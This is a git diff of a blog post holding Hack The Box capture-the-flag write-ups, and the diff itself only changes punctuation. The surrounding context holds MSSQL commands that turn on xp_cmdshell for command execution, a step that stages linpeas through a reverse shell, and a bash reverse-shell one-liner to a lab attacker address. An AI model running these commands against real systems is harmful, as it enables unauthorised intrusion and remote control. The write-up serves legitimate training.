@@ -1,10 +1,10 @@
 ---
-title: "HTB: Learn the basics of Penetration Testing - Tier 2"
+title: "HTB: Learn the basics of Penetration Testing – Tier 2"
 slug: "startingpoint-tier2"
 date: 2022-11-02T11:30:33-07:00
 draft: false
-description: "Short writeups for each of the Starting Point boxes on HTB - Tier 2"
-summary: "Short writeups for each of the [Starting Point](https://app.hackthebox.com/starting-point) boxes on HTB - Tier 2"
+description: "Short writeups for each of the Starting Point boxes on HTB – Tier 2"
+summary: "Short writeups for each of the [Starting Point](https://app.hackthebox.com/starting-point) boxes on HTB – Tier 2"
 categories: ["htb"]
 tags: ["smb", "sql", "ssh", "ftp"]
 keywords: ["hackthebox","htb", "archetype","oopsie","vaccine","unified"]
@@ -127,11 +127,11 @@ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth AR
 Then I used the [previous link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) as well as this [cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) for `sql` commands. Generating command execution seems good:
 
 ```ps
-EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
-EXEC sp_configure 'show advanced options', 1; — priv
-RECONFIGURE; — priv
-EXEC sp_configure 'xp_cmdshell', 1; — priv
-RECONFIGURE; — priv
+EXEC xp_cmdshell 'net user'; – privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; – priv
+RECONFIGURE; – priv
+EXEC sp_configure 'xp_cmdshell', 1; – priv
+RECONFIGURE; – priv
 ```
 
 And we have command execution:
@@ -353,7 +353,7 @@ We can now go from `www-data` to `robert` via `su robert` and put in his passwor
 ### privesc
 Time for [`linpeas`](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md). I simply downloaded the `.sh` file locally, hosted it on a python server, and then downloaded it on the reverse shell.
 
-On the first look through, the `bugtracker` group stood out - especially since there is an unknown `SUID` (Set owner User ID) binary called `/usr/bin/bugtracker`. 
+On the first look through, the `bugtracker` group stood out – especially since there is an unknown `SUID` (Set owner User ID) binary called `/usr/bin/bugtracker`. 
 
 ![linpeas](images/linpeas.png)
 
@@ -484,7 +484,7 @@ There could be valuable columns in `pg_catalog`, but I noticed a command flag ca
 
 ![sqlshell](images/sqlshell.png)
 
-Time for a reverse shell - I just found [these payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) for bash.
+Time for a reverse shell – I just found [these payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp) for bash.
 
 ```sh
 bash -c "bash -i >& /dev/tcp/10.10.14.66/1337 0>&1"
